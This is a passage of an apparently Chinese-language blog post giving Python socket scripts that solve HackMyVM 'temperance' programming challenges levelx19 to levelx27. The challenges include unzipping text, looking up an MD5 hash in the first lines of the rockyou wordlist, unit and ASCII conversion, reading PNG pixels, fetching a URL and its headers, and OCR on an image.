        <span class="token keyword">with</span> zip_ref<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>txt_file_name<span class="token punctuation">)</span> <span class="token keyword">as</span> txt_file<span class="token punctuation">:</span>
            text <span class="token operator">=</span> txt_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> text

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx19'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>extract_text_from_zip<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx20-md5碰撞-rockyou"><a href="#levelx20-md5碰撞-rockyou" class="headerlink" title="levelx20 md5碰撞 rockyou"></a>levelx20 md5碰撞 rockyou</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> hashlib

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>


<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx20'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'E:/字典/字典超超超全/字典超超超全/字典及生成工具/Passwords/rockyou.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        lines <span class="token operator">=</span> <span class="token punctuation">[</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>lines<span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>
            k<span class="token operator">=</span>i
            md5_hasher <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
            md5_hasher<span class="token punctuation">.</span>update<span class="token punctuation">(</span>i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            md5_hash <span class="token operator">=</span> md5_hasher<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>md5_hash<span class="token punctuation">)</span>
            <span class="token keyword">if</span> md5_hash<span class="token operator">==</span>data3<span class="token punctuation">:</span>
                data3<span class="token operator">=</span>k
                <span class="token keyword">break</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx21-单位换算-kb"><a href="#levelx21-单位换算-kb" class="headerlink" title="levelx21 单位换算 kb"></a>levelx21 单位换算 kb</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> hashlib

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">def</span> <span class="token function">convert_to_kb</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>
    kb <span class="token operator">=</span> number <span class="token operator">/</span> <span class="token number">1024</span>
    <span class="token keyword">return</span> <span class="token string">"&#123;:.2f&#125;KB"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>kb<span class="token punctuation">)</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx21'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>convert_to_kb<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx22-ascii转换"><a href="#levelx22-ascii转换" class="headerlink" title="levelx22 ascii转换"></a>levelx22 ascii转换</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> hashlib

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx22'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data3<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    t<span class="token operator">=</span><span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> data3<span class="token punctuation">:</span>
        t<span class="token operator">+=</span>i
    data3<span class="token operator">=</span>t
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx23-png像素alpha转ascii"><a href="#levelx23-png像素alpha转ascii" class="headerlink" title="levelx23 png像素alpha转ascii"></a>levelx23 png像素alpha转ascii</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx23'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    image_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    <span class="token keyword">with</span> BytesIO<span class="token punctuation">(</span>image_data<span class="token punctuation">)</span> <span class="token keyword">as</span> img_file<span class="token punctuation">:</span>
        <span class="token keyword">with</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>img_file<span class="token punctuation">)</span> <span class="token keyword">as</span> img<span class="token punctuation">:</span>
            <span class="token keyword">if</span> img<span class="token punctuation">.</span>size <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"图像不是5x1像素"</span><span class="token punctuation">)</span>
            pixels <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            data3 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>pixel<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> pixel <span class="token keyword">in</span> pixels<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx24-curl"><a href="#levelx24-curl" class="headerlink" title="levelx24 curl"></a>levelx24 curl</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">import</span> requests

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx24'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    re<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    data3<span class="token operator">=</span>re<span class="token punctuation">.</span>text
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx25-获取head指定字段"><a href="#levelx25-获取head指定字段" class="headerlink" title="levelx25 获取head指定字段"></a>levelx25 获取head指定字段</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">import</span> requests

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx25'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    re<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
    data3<span class="token operator">=</span>re<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"HMV-Code"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx26-base64解码获取一个图片并读取"><a href="#levelx26-base64解码获取一个图片并读取" class="headerlink" title="levelx26 base64解码获取一个图片并读取"></a>levelx26 base64解码获取一个图片并读取</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
<span class="token keyword">import</span> pytesseract
<span class="token keyword">import</span> base64 

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">def</span> <span class="token function">extract_data</span><span class="token punctuation">(</span>encoded_png_base64<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># Decode base64 string to bytes</span>
        decoded_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>encoded_png_base64<span class="token punctuation">)</span>
        <span class="token comment"># Open image from bytes</span>
        image <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>decoded_data<span class="token punctuation">)</span><span class="token punctuation">)</span>
        text <span class="token operator">=</span> pytesseract<span class="token punctuation">.</span>image_to_string<span class="token punctuation">(</span>image<span class="token punctuation">,</span>lang<span class="token operator">=</span><span class="token string">"eng"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> text

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx26'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>extract_data<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data3<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx27-获取相应包指定user的id"><a href="#levelx27-获取相应包指定user的id" class="headerlink" title="levelx27 获取相应包指定user的id"></a>levelx27 获取相应包指定user的id</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> re
HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">import</span> requests

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
